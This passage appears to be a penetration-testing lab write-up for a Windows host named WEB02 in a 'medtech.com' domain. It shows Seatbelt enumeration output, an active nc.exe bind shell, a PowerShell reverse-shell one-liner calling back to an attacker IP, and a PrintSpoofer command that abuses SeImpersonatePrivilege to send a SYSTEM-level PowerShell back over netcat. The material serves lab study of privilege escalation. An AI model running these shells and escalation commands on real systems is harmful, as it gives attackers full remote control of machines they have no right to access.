  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Guest Authentication Service
  Version                        : 11.3.0.58230
  IsDotNet                       : False

  Name                           : vm3dservice
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:BAD:PAI(A;;FA;;;SY)(A;;FA;;;BA)(A;;0x1200a9;;;BU)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 8.17.03.0001
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 11.3.0.29534
  IsDotNet                       : False

====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== SysmonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:135            0.0.0.0:0              LISTEN     924   RpcEptMapper    svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     708                   lsass.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     576                   wininit.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1204  EventLog        svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     1576  Schedule        svchost.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     708   Netlogon        lsass.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     2176  Spooler         spoolsv.exe
  0.0.0.0:49670          0.0.0.0:0              LISTEN     2060  PolicyAgent     svchost.exe
  0.0.0.0:49671          0.0.0.0:0              LISTEN     692                   services.exe
  127.0.0.1:135          127.0.0.1:53030        ESTAB      924   RpcEptMapper    svchost.exe
  127.0.0.1:53030        127.0.0.1:135          ESTAB      7768                  "C:\TEMP\seatbelt.exe" -group=all
  172.16.250.254:139     0.0.0.0:0              LISTEN     4                     System
  172.16.250.254:54649   0.0.0.0:0              LISTEN     6364  ALG             alg.exe
  192.168.250.121:139    0.0.0.0:0              LISTEN     4                     System
  192.168.250.121:8888   192.168.45.170:51490   ESTAB      5244                  C:\temp\nc.exe  -lvp 8888 -e cmd.exe
  192.168.250.121:53029  192.168.45.170:80      CLOSE_WAIT 6540                  powershell
====== TokenGroups ======

Current Token's Groups

  Everyone                                 S-1-1-0
  BUILTIN\Performance Monitor Users        S-1-5-32-558
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\SERVICE                     S-1-5-6
  CONSOLE LOGON                            S-1-2-1
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  LOCAL                                    S-1-2-0
  NT SERVICE\ALL SERVICES                  S-1-5-80-0
====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 1
  LocalAccountTokenFilterPolicy  : 
  FilterAdministratorToken       : 
    [*] Default Windows settings - Only the RID-500 local admin account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            664    W32Time                 svchost.exe
  0.0.0.0:162            5012   SNMPTRAP                snmptrap.exe
  0.0.0.0:500            2068   IKEEXT                  svchost.exe
  0.0.0.0:4500           2068   IKEEXT                  svchost.exe
  0.0.0.0:5353           1140   Dnscache                svchost.exe
  0.0.0.0:5355           1140   Dnscache                svchost.exe
  0.0.0.0:51044          1140   Dnscache                svchost.exe
  0.0.0.0:56788          1140   Dnscache                svchost.exe
  0.0.0.0:64752          1140   Dnscache                svchost.exe
  127.0.0.1:1900         5004   SSDPSRV                 svchost.exe
  127.0.0.1:49933        3148   RemoteAccess            svchost.exe
  127.0.0.1:50163        708    Netlogon                lsass.exe
  127.0.0.1:50543        2076   iphlpsvc                svchost.exe
  127.0.0.1:53009        5004   SSDPSRV                 svchost.exe
  127.0.0.1:53011        1352   NlaSvc                  svchost.exe
  127.0.0.1:65377        1408   gpsvc                   svchost.exe
  172.16.250.254:137     4                              System
  172.16.250.254:138     4                              System
  172.16.250.254:1900    5004   SSDPSRV                 svchost.exe
  172.16.250.254:53008   5004   SSDPSRV                 svchost.exe
  192.168.250.121:137    4                              System
  192.168.250.121:138    4                              System
  192.168.250.121:1900   5004   SSDPSRV                 svchost.exe
  192.168.250.121:53007  5004   SSDPSRV                 svchost.exe
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at Seatbelt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at Seatbelt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : medtech.com
  DefaultUserName                : joe
  DefaultPassword                : 
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 

====== WindowsCredentialFiles ======

====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : False
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : False
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : False
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 0
====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,156,0,3,2,2
  BootupState                   : Normal boot
  Caption                       : WEB02
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -420
  DaylightInEffect              : True
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : WEB02
  Domain                        : medtech.com
  DomainRole                    : 3
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : WEB02
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 2
  NumberOfProcessors            : 1
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : True
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      SQLServer
      DialIn
      NT
      Server_NT
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 4293943296
  WakeUpType                    : 6

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :   
  MaximumQueueSize                  :   
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :   
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :   
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    : 
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 18.36 seconds

```
- privileges
```
whoami /priv
```
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
- this means we can impersonate another user so we can try to elevate our privileges with print spoofer 
	- Didn't work 
- Going to try Juicy Potato jp.exe 
	- Create shell.bat file 
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.170,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Didn't work 
- Used printspoofer with the following command to get NT/Authority System
```
nc -nlvp 1234
```
```
C:\TEMP\printspoofer64_2.exe -c "C:\TEMP\nc.exe 192.168.45.170 1234 -e powershell"
```
